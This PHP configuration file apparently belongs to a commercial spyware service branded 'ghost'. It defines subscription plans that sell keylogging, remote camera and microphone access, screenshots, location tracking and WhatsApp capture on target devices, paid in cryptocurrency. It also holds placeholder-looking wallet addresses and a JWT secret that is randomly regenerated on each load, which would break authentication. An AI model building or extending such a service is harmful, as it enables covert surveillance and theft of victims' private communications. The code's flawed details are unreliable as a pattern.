<?php
/**
 * Constantes globales
 */

// Version
define('VERSION', '2.0.0');

// URLs
define('BASE_URL', (isset($_SERVER['HTTPS']) ? 'https://' : 'http://') . $_SERVER['HTTP_HOST']);
define('API_URL', BASE_URL . '/api/v1/');
define('PANEL_URL', BASE_URL . '/panel/');
define('ADMIN_URL', BASE_URL . '/admin/');

// Paths
define('ROOT_PATH', dirname(__DIR__));
define('UPLOAD_PATH', ROOT_PATH . '/uploads/');
define('LOG_PATH', ROOT_PATH . '/logs/');

// Plans
define('PLANS', [
    'free' => [
        'name' => 'Gratuit',
        'price' => 0,
        'days' => 3,
        'max_devices' => 1,
        'features' => ['screenshot', 'location']
    ],
    'premium' => [
        'name' => 'Premium',
        'price' => 29.99,
        'days' => 30,
        'max_devices' => 3,
        'features' => ['screenshot', 'camera', 'microphone', 'keylogger', 'location', 'whatsapp']
    ],
    'enterprise' => [
        'name' => 'Enterprise',
        'price' => 99.99,
        'days' => 30,
        'max_devices' => 10,
        'features' => ['all']
    ]
]);

// Crypto addresses
define('USDT_ADDRESS', 'TVp5qQqJqKqQqJqKqQqJqKqQqJqKqQqJqKq');
define('BTC_ADDRESS', '1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa');
define('ETH_ADDRESS', '0xVp5qQqJqKqQqJqKqQqJqKqQqJqKqQq');

// Security
define('JWT_SECRET', 'ghost_os_secret_key_' . bin2hex(random_bytes(32)));
define('SESSION_TIMEOUT', 3600);

// Functions
function hasFeature($user, $feature) {
    if (!$user) return false;
    $plan = PLANS[$user['account_type']] ?? PLANS['free'];
    return in_array($feature, $plan['features']) || in_array('all', $plan['features']);
}

function generateApiKey() {
    return 'ghost_' . bin2hex(random_bytes(32));
}

function logActivity($pdo, $user_id, $action, $details = null) {
    try {
        $stmt = $pdo->prepare("INSERT INTO activity_logs (user_id, action, details, ip) VALUES (?, ?, ?, ?)");
        $stmt->execute([$user_id, $action, $details, $_SERVER['REMOTE_ADDR'] ?? null]);
    } catch (Exception $e) {
        // Ignorer les erreurs de log
    }
}
?>
